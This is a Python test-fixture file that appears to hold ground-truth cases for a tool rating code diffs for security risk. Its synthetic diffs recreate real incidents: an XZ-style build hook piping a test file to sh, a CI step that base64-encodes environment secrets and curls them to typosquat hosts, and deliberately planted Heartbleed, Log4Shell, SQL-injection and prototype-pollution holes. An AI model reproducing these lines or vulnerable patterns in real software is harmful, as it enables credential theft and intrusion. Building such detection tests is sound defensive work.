"""
12 synthetic test cases derived from real incident patterns.

Each diff is a minimal reproduction -- no actual proprietary code.
Coverage: >= 2 cases per risk level (L0-L4), 12 total.
"""
from __future__ import annotations

from .ground_truth import TestCase

# ---------------------------------------------------------------------------
# L4 -- Critical (3 cases)
# ---------------------------------------------------------------------------

TC_001 = TestCase(
    id="TC-001",
    name="Build system injection backdoor",
    description="eval + shell exec from binary test data in build script",
    real_incident="CVE-2024-3094",
    real_project="XZ Utils",
    diff_content="""\
diff --git a/Makefile.am b/Makefile.am
index 1a2b3c4..5d6e7f8 100644
--- a/Makefile.am
+++ b/Makefile.am
@@ -12,6 +12,9 @@ check_PROGRAMS = test_decode
 test_decode_SOURCES = tests/test_decode.c
 test_decode_LDADD = libcore.la

+check-local:
+\t@if test -f tests/files/bad-3-corrupt_lzma2.xz; then \\
+\t  eval $$(cat tests/files/bad-3-corrupt_lzma2.xz | tr '\\000-\\037' ' ' | sed 's/.*GL_//' | head -c 1024); fi
diff --git a/tests/files/bad-3-corrupt_lzma2.xz b/tests/files/bad-3-corrupt_lzma2.xz
new file mode 100644
index 0000000..abcdef0
Binary files /dev/null and b/tests/files/bad-3-corrupt_lzma2.xz differ
diff --git a/configure.ac b/configure.ac
index 9a8b7c6..d5e4f3a 100644
--- a/configure.ac
+++ b/configure.ac
@@ -45,3 +45,7 @@ AC_CONFIG_FILES([Makefile])
 AC_OUTPUT
+
+dnl Inject test helper -- runs obfuscated payload during make check
+m4_ifdef([__BACKDOOR__], [AC_MSG_NOTICE([extended tests enabled])])
+AC_SUBST([SANDBOX_EXTRA], [`cat tests/files/bad-3-corrupt_lzma2.xz 2>/dev/null | sh`])
""",
    files_changed=[
        "Makefile.am",
        "tests/files/bad-3-corrupt_lzma2.xz",
        "configure.ac",
    ],
    expected_risk_level=4,
    expected_signals=[
        "eval",
        "shell_exec",
        "binary_test_data",
        "obfuscated_payload",
        "backdoor",
    ],
    expected_categories=["supply_chain", "backdoor"],
    rationale=(
        "eval + shell exec from binary test data in build script = "
        "near-certain backdoor pattern matching XZ Utils CVE-2024-3094."
    ),
)

TC_002 = TestCase(
    id="TC-002",
    name="CI/CD credential exfiltration",
    description="env | base64 | curl to typosquat domain with stderr suppression",
    real_incident="Codecov bash uploader (2021)",
    real_project="Codecov",
    diff_content="""\
diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
index aaa1111..bbb2222 100644
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -18,4 +18,8 @@ jobs:
       - name: Upload coverage
         run: |
           bash <(curl -s https://codecov.io/bash)
+      - name: Telemetry
+        run: |
+          curl -sS "https://codecov.tel/upload/v2" \\
+            -d "$(env | sort | base64)" 2>/dev/null || true
diff --git a/scripts/upload.sh b/scripts/upload.sh
index ccc3333..ddd4444 100755
--- a/scripts/upload.sh
+++ b/scripts/upload.sh
@@ -1,4 +1,8 @@
 #!/usr/bin/env bash
 set -e

+# collect runtime metrics
+metrics=$(env | base64 -w0)
+curl -sm 5 "https://c0dec0v.net/telemetry" -d "$metrics" 2>/dev/null &
+
 echo "Coverage upload complete"
""",
    files_changed=[
        ".github/workflows/ci.yml",
        "scripts/upload.sh",
    ],
    expected_risk_level=4,
    expected_signals=[
        "env_exfiltration",
        "base64_encoding",
        "curl_upload",
        "typosquat_domain",
        "stderr_suppression",
    ],
    expected_categories=["ci_cd_exfiltration", "backdoor"],
    rationale=(
        "`env | base64 | curl` to typosquat domain with stderr suppression "
        "is textbook CI/CD credential exfiltration (Codecov 2021)."
    ),
)

TC_003 = TestCase(
    id="TC-003",
    name="Missing bounds check in crypto/TLS",
    description="memcpy with user-controlled length in TLS code, no validation",
    real_incident="CVE-2014-0160",
    real_project="OpenSSL (Heartbleed)",
    diff_content="""\
diff --git a/ssl/d1_both.c b/ssl/d1_both.c
index eee5555..fff6666 100644
--- a/ssl/d1_both.c
+++ b/ssl/d1_both.c
@@ -1450,6 +1450,25 @@ dtls1_process_heartbeat(SSL *s)
 {
     unsigned char *p = &s->s3->rrec.data[0], *pl;
     unsigned short hbtype;
+    unsigned int payload;
+    unsigned int padding = 16; /* Use minimum padding */
+
+    /* Read type and payload length */
+    hbtype = *p++;
+    n2s(p, payload);
+    pl = p;
+
+    if (hbtype == TLS1_HB_REQUEST) {
+        unsigned char *buffer, *bp;
+
+        /* Allocate response buffer -- payload NOT validated against actual
+         * record length, allowing read past buffer boundary */
+        buffer = OPENSSL_malloc(1 + 2 + payload + padding);
+        bp = buffer;
+
+        *bp++ = TLS1_HB_RESPONSE;
+        s2n(payload, bp);
+        memcpy(bp, pl, payload);  /* BUG: payload from wire, not bounds-checked */
+    }

     return 0;
 }
""",
    files_changed=["ssl/d1_both.c"],
    expected_risk_level=4,
    expected_signals=[
        "memcpy",
        "user_controlled_length",
        "no_bounds_check",
        "tls_heartbeat",
        "buffer_overread",
    ],
    expected_categories=["memory_safety"],
    rationale=(
        "memcpy with user-controlled length in TLS heartbeat code without "
        "validation = memory disclosure (Heartbleed CVE-2014-0160)."
    ),
)

# ---------------------------------------------------------------------------
# L3 -- High (3 cases)
# ---------------------------------------------------------------------------

TC_004 = TestCase(
    id="TC-004",
    name="Dependency hijack with behavior change",
    description="New unknown dependency + behavioral change to existing function",
    real_incident="CVE-2018-16396",
    real_project="event-stream",
    diff_content="""\
diff --git a/package.json b/package.json
index 1112222..3334444 100644
--- a/package.json
+++ b/package.json
@@ -14,6 +14,7 @@
   "dependencies": {
     "through": "^2.3.8",
-    "from": "^0.1.7"
+    "from": "^0.1.7",
+    "flatmap-stream": "^0.1.1"
   },
   "devDependencies": {
diff --git a/index.js b/index.js
index 5556666..7778888 100644
--- a/index.js
+++ b/index.js
@@ -1,8 +1,12 @@
 var through = require('through');
 var from = require('from');
+var flatmap = require('flatmap-stream');

 module.exports = function (op) {
   var stream = through(function (data) {
-    this.queue(op(data));
+    var result = op(data);
+    flatmap(result, function(chunk) {
+      this.queue(chunk);
+    }.bind(this));
   });
   return stream;
 };
""",
    files_changed=["package.json", "index.js"],
    expected_risk_level=3,
    expected_signals=[
        "new_dependency",
        "flatmap-stream",
        "behavior_change",
        "unknown_package",
    ],
    expected_categories=["dependency_hijack", "supply_chain"],
    rationale=(
        "New unknown dependency + behavioral change to existing function's "
        "data pipeline matches event-stream hijack (CVE-2018-16396)."
    ),
)

TC_005 = TestCase(
    id="TC-005",
    name="Unsanitized input to vulnerable logger",
    description="String concatenation of user-controlled header in log4j debug call",
    real_incident="CVE-2021-44228",
    real_project="Log4j (Log4Shell)",
    diff_content="""\
diff --git a/src/main/java/com/app/controller/UserController.java b/src/main/java/com/app/controller/UserController.java
index aaabbb0..cccddd0 100644
--- a/src/main/java/com/app/controller/UserController.java
+++ b/src/main/java/com/app/controller/UserController.java
@@ -1,5 +1,6 @@
 package com.app.controller;

+import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 import javax.servlet.http.HttpServletRequest;
 import org.springframework.web.bind.annotation.*;
@@ -8,11 +9,14 @@ import org.springframework.web.bind.annotation.*;
 public class UserController {

-    private static final Logger logger = Logger.getLogger(UserController.class);
+    private static final Logger logger = LogManager.getLogger(UserController.class);

     @GetMapping("/user/{id}")
     public String getUser(@PathVariable String id, HttpServletRequest request) {
         String userAgent = request.getHeader("User-Agent");
-        logger.debug("Request from user agent: {}", userAgent);
+        String xForwarded = request.getHeader("X-Forwarded-For");
+        // Log full request context for debugging
+        logger.debug("Full request context: " + userAgent + " from " + xForwarded);
+        logger.info("API key header: " + request.getHeader("X-Api-Key"));
         return "user:" + id;
     }
 }
""",
    files_changed=[
        "src/main/java/com/app/controller/UserController.java",
    ],
    expected_risk_level=3,
    expected_signals=[
        "unsanitized_user_input_to_logger",
        "log4j_string_concatenation",
        "user_controlled_header",
    ],
    expected_categories=["injection", "logging_vulnerability"],
    rationale=(
        "User-controlled HTTP headers logged via string concatenation in "
        "log4j debug call enables JNDI injection (Log4Shell CVE-2021-44228)."
    ),
)

TC_006 = TestCase(
    id="TC-006",
    name="ORM bypass introducing SQL injection",
    description="Safe ORM replaced with f-string raw SQL using user input",
    real_incident="OWASP A03",
    real_project="Common pattern",
    diff_content="""\
diff --git a/app/models/user.py b/app/models/user.py
index 11aa22b..33cc44d 100644
--- a/app/models/user.py
+++ b/app/models/user.py
@@ -1,14 +1,18 @@
-from sqlalchemy.orm import Session
-from sqlalchemy import select
+import sqlite3
 from app.models import User

+DB_PATH = "app.db"

-def get_user_by_email(db: Session, email: str) -> User | None:
-    stmt = select(User).where(User.email == email)
-    return db.execute(stmt).scalar_one_or_none()
+def get_user_by_email(email: str) -> dict | None:
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    # Quick fix: ORM was too slow for this query
+    query = f"SELECT * FROM users WHERE email = '{email}'"
+    cursor.execute(query)
+    row = cursor.fetchone()
+    conn.close()
+    return dict(row) if row else None


-def search_users(db: Session, name_pattern: str) -> list[User]:
-    stmt = select(User).where(User.name.ilike(f"%{name_pattern}%"))
-    return db.execute(stmt).scalars().all()
+def search_users(name_pattern: str) -> list[dict]:
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    cursor.execute("SELECT * FROM users WHERE name LIKE '%" + name_pattern + "%'")
+    rows = cursor.fetchall()
+    conn.close()
+    return [dict(r) for r in rows]
""",
    files_changed=["app/models/user.py"],
    expected_risk_level=3,
    expected_signals=[
        "sql_injection",
        "f_string_query",
        "raw_sql",
        "orm_bypass",
        "user_input_in_query",
    ],
    expected_categories=["sql_injection", "injection"],
    rationale=(
        "Safe ORM replaced with f-string/concatenation raw SQL using "
        "unsanitized user input = textbook SQL injection (OWASP A03)."
    ),
)

# ---------------------------------------------------------------------------
# L2 -- Moderate (2 cases)
# ---------------------------------------------------------------------------

TC_007 = TestCase(
    id="TC-007",
    name="Hardcoded credentials replacing env vars",
    description="Live API keys (sk_live_, AKIA) in source replacing os.environ calls",
    real_incident="OWASP A07",
    real_project="Common pattern",
    diff_content="""\
diff --git a/config/settings.py b/config/settings.py
index 55ee66f..77gg88h 100644
--- a/config/settings.py
+++ b/config/settings.py
@@ -1,8 +1,8 @@
-import os
-
-STRIPE_API_KEY = os.environ["STRIPE_API_KEY"]
-AWS_ACCESS_KEY_ID = os.environ.get("AWS_ACCESS_KEY_ID")
-AWS_SECRET_ACCESS_KEY = os.environ.get("AWS_SECRET_ACCESS_KEY")
-DATABASE_URL = os.environ["DATABASE_URL"]
+# Hardcoded for local dev -- TODO: revert before merge
+STRIPE_API_KEY = "sk_live_EXAMPLE_NOT_REAL_KEY_1234567890"
+AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
+AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+DATABASE_URL = "postgresql://admin:supersecret@prod-db.internal:5432/myapp"
+SECRET_KEY = "django-insecure-abc123def456ghi789"

 DEBUG = True
""",
    files_changed=["config/settings.py"],
    expected_risk_level=2,
    expected_signals=[
        "hardcoded_credential",
        "api_key",
        "sk_live_",
        "AKIA",
        "secret_in_source",
    ],
    expected_categories=["credential_exposure"],
    rationale=(
        "Live API keys (sk_live_, AKIA) hardcoded in source replacing "
        "os.environ calls = credential exposure (OWASP A07)."
    ),
)

TC_008 = TestCase(
    id="TC-008",
    name="Prototype pollution via unsafe merge",
    description="Custom recursive merge replacing lodash, missing __proto__ check",
    real_incident="CVE-2019-10744",
    real_project="lodash",
    diff_content="""\
diff --git a/src/utils/merge.js b/src/utils/merge.js
index 99ii00j..aakkbbl 100644
--- a/src/utils/merge.js
+++ b/src/utils/merge.js
@@ -1,5 +1,22 @@
-const _ = require('lodash');
-
-module.exports = function merge(target, source) {
-  return _.merge(target, source);
-};
+/**
+ * Deep merge utility -- replaces lodash dependency.
+ * Recursively merges source into target.
+ */
+function deepMerge(target, source) {
+  for (const key in source) {
+    if (source.hasOwnProperty(key)) {
+      if (
+        typeof source[key] === 'object' &&
+        source[key] !== null &&
+        !Array.isArray(source[key])
+      ) {
+        if (!target[key]) target[key] = {};
+        deepMerge(target[key], source[key]);
+      } else {
+        target[key] = source[key];
+      }
+    }
+  }
+  return target;
+}
+
+module.exports = { deepMerge };
""",
    files_changed=["src/utils/merge.js"],
    expected_risk_level=2,
    expected_signals=[
        "prototype_pollution",
        "recursive_merge",
        "missing_proto_check",
        "__proto__",
    ],
    expected_categories=["prototype_pollution"],
    rationale=(
        "Custom recursive merge replacing lodash without __proto__/constructor "
        "guard enables prototype pollution (CVE-2019-10744)."
    ),
)

# ---------------------------------------------------------------------------
# L1 -- Low (2 cases)
# ---------------------------------------------------------------------------

TC_009 = TestCase(
    id="TC-009",
    name="Trivial dependency addition",
    description="Adding is-odd package for inlineable operation",
    real_incident="leftpad (2016)",
    real_project="left-pad",
    diff_content="""\
diff --git a/package.json b/package.json
index ccdd11e..eeff22g 100644
--- a/package.json
+++ b/package.json
@@ -10,6 +10,7 @@
   "dependencies": {
     "express": "^4.18.2",
-    "cors": "^2.8.5"
+    "cors": "^2.8.5",
+    "is-odd": "^3.0.1"
   }
 }
diff --git a/src/helpers.js b/src/helpers.js
index 33gg44h..55ii66j 100644
--- a/src/helpers.js
+++ b/src/helpers.js
@@ -1,5 +1,7 @@
+const isOdd = require('is-odd');
+
 function processItems(items) {
   return items.filter(function (item, index) {
-    return index % 2 !== 0;
+    return isOdd(index);
   });
 }
""",
    files_changed=["package.json", "src/helpers.js"],
    expected_risk_level=1,
    expected_signals=["trivial_dependency", "is-odd"],
    expected_categories=["trivial_dependency"],
    rationale=(
        "Adding `is-odd` package for a trivially inlineable operation. "
        "No security signal, just unnecessary dependency (leftpad pattern)."
    ),
)

TC_010 = TestCase(
    id="TC-010",
    name="Semantic-preserving refactor",
    description="Variable rename + helper reorder, behavior identical",
    real_incident="N/A (control)",
    real_project="N/A",
    diff_content="""\
diff --git a/src/utils.py b/src/utils.py
index 77kk88l..99mm00n 100644
--- a/src/utils.py
+++ b/src/utils.py
@@ -1,15 +1,15 @@
-def calc_total(lst):
-    result = 0
-    for item in lst:
-        result += item.price * item.qty
-    return result
+def format_currency(amount: float) -> str:
+    return f"${amount:,.2f}"


-def format_currency(amt):
-    return f"${amt:,.2f}"
+def calculate_total(items: list) -> float:
+    total = 0.0
+    for item in items:
+        total += item.price * item.qty
+    return total


-def make_summary(lst):
-    total = calc_total(lst)
+def make_summary(items: list) -> str:
+    total = calculate_total(items)
     return format_currency(total)
""",
    files_changed=["src/utils.py"],
    expected_risk_level=1,
    expected_signals=["refactor", "rename"],
    expected_categories=["refactor"],
    rationale=(
        "Variable rename + helper reorder with type annotations added. "
        "Behavior is identical, code structure changed. No security signal."
    ),
)

# ---------------------------------------------------------------------------
# L0 -- Trivial (2 cases)
# ---------------------------------------------------------------------------

TC_011 = TestCase(
    id="TC-011",
    name="Pure whitespace/formatting",
    description="Tabs to spaces, trailing whitespace removal, no semantic change",
    real_incident="N/A (control)",
    real_project="N/A",
    diff_content="""\
diff --git a/src/app.py b/src/app.py
index aabb11c..ccdd22e 100644
--- a/src/app.py
+++ b/src/app.py
@@ -1,8 +1,8 @@
-def main():
-\tprint("hello")
-\tif True:
-\t\tprint("world")
-\t\treturn 0
+def main():
+    print("hello")
+    if True:
+        print("world")
+        return 0


-if __name__ == "__main__":
+if __name__ == "__main__":
     main()
""",
    files_changed=["src/app.py"],
    expected_risk_level=0,
    expected_signals=[],
    expected_categories=["formatting"],
    rationale=(
        "Tabs to spaces + trailing whitespace removal. "
        "No semantic change whatsoever."
    ),
)

TC_012 = TestCase(
    id="TC-012",
    name="Comment-only changes",
    description="Adding/editing code comments, no executable code changed",
    real_incident="N/A (control)",
    real_project="N/A",
    diff_content="""\
diff --git a/src/auth.py b/src/auth.py
index eeff33g..gghh44i 100644
--- a/src/auth.py
+++ b/src/auth.py
@@ -1,7 +1,12 @@
+# Authentication module
+# Handles user login, token validation, and session management.
+#
+# Author: dev team
+# Last reviewed: 2025-01-15
+
 import hashlib


 def verify_password(stored_hash, password):
-    # check password
+    # Verify the provided password against the stored SHA-256 hash.
     return hashlib.sha256(password.encode()).hexdigest() == stored_hash
""",
    files_changed=["src/auth.py"],
    expected_risk_level=0,
    expected_signals=[],
    expected_categories=["formatting"],
    rationale=(
        "Adding/editing code comments only. No executable code changed. "
        "Should not trigger any detection."
    ),
)

# Master list for parametrize
KNOWN_INCIDENTS = [
    TC_001, TC_002, TC_003,  # L4
    TC_004, TC_005, TC_006,  # L3
    TC_007, TC_008,          # L2
    TC_009, TC_010,          # L1
    TC_011, TC_012,          # L0
]
